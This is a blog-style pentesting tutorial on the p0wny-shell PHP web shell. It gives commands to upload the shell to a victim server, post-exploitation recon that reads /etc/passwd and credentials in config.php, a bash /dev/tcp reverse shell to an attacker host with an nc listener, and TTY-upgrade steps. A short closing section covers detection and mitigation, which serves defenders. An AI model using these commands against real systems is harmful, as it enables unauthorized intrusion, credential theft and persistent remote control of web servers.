---
layout: post
title: "p0wny-shell: full control with a simple PHP web shell"
date: 2025-07-09
categories: [hacking, web, post-exploitation]
tags: [webshell, php, postexploitation, rce, pentesting]
image:
  path: /assets/img/p0wny@shell/p0wnyshell-logo.png
  alt: "p0wnyshell logo"
summary: "A practical and technical analysis of flozz/p0wny-shell, a powerful and lightweight PHP shell for RCE scenarios in web servers. Learn how it works, how to use it, and how to defend against it."
---

## üîì What is p0wny-shell?

`p0wny-shell` is a PHP web shell developed by [flozz](https://github.com/flozz/p0wny-shell) that allows executing system commands directly from a browser. Unlike more complex shells, it stands out for being extremely lightweight (just one file) and offering an interactive interface very similar to a real terminal, even in limited environments.

It's ideal for scenarios where you've achieved **remote command execution (RCE)** but lack an interactive TTY shell, such as:

* Uploading malicious files through poorly filtered forms
* RCE via parameter injection
* Remote File Inclusion (RFI)

---

## ‚öôÔ∏è Key Features

* Browser-based shell (simple and interactive interface)
* Supports `cd`, `clear`, path autocompletion, and more
* No external dependencies required
* Extremely easy to upload and execute

---

## üöÄ How to use p0wny-shell step-by-step

### 1. Upload to the server

If you‚Äôve gained RCE or file upload capability (e.g., via a vulnerable form), simply upload the `p0wny.php` file:

```bash
curl -F "file=@p0wny.php" http://victim.com/upload.php
```

Or, if you already have RCE:

```php
file_put_contents("p0wny.php", file_get_contents("https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"));
```

### 2. Access via browser

Open your browser at `http://victim.com/p0wny.php` and you‚Äôll see a shell interface very similar to bash:

```
> whoami
www-data
> uname -a
Linux ubuntu 5.15.0-101-generic ...
```

### üíª Real-world usage example

Below is a screenshot showing basic usage of p0wny-shell in action, including directory navigation and file creation:

![Example usage of p0wny-shell](/assets/img/p0wny@shell/p0wny-shell-ejemplo.png)

---

### 3. Useful commands

```bash
whoami                  # Check current user
id                      # UID, GID and group info
pwd                     # Current directory
uname -a                # System and kernel info
cat /etc/passwd         # User accounts
ps aux                  # Running processes
netstat -tunlp          # Listening ports and connections
find / -perm -4000      # Look for SUID binaries (privilege escalation)
ls -la                  # List files (including hidden)
cd /var/www/html        # Navigate to web directory
cat config.php          # Extract database credentials or secrets
```

> üß† Tip: p0wny-shell emulates `cd` and `clear` internally, since PHP doesn‚Äôt maintain context between executions.

---

## ü™ù From web shell to reverse shell

To get a more interactive shell:

1. On your machine:

```bash
nc -lvnp 4444
```

2. From p0wny-shell:

```bash
bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"
```

> You can also use `python`, `perl`, or `php` for the reverse shell if available.

Then upgrade it:

```bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset
```

---

## üõ°Ô∏è Detection and Protection

### üîç Detection

* Check for suspicious files (`find /var/www -name '*.php' -exec grep shell {} \;`)
* Inspect HTTP logs for executed commands (`access.log`)
* Look for anomalies (outgoing traffic from webserver, connections to high ports)

### üõ°Ô∏è Mitigation

* Strict filtering of uploaded files
* Disable dangerous functions in `php.ini`:

```ini
disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

* Use a WAF or set ModSecurity rules
* Periodic scanning with tools like `LMD`, `Chkrootkit`, `ClamAV`

---

## üìö Additional Resources

* [Official repository](https://github.com/flozz/p0wny-shell)
* [More web shells](https://github.com/BlackArch/webshells)
* [GTFOBins](https://gtfobins.github.io/) for privilege escalation once inside

---

## üß† Conclusion

p0wny-shell is a tool that‚Äôs as simple as it is powerful. In real pentesting contexts, it can be the difference between limited code execution and full system control. For defenders, it's a stark reminder of why every entry point‚Äîno matter how trivial‚Äîmust be locked down.

---

Did you find this article useful? Feel free to share it or follow me on [LinkedIn](https://www.linkedin.com/in/adrian-perez-moreno/) for more content on real-world hacking and cybersecurity.
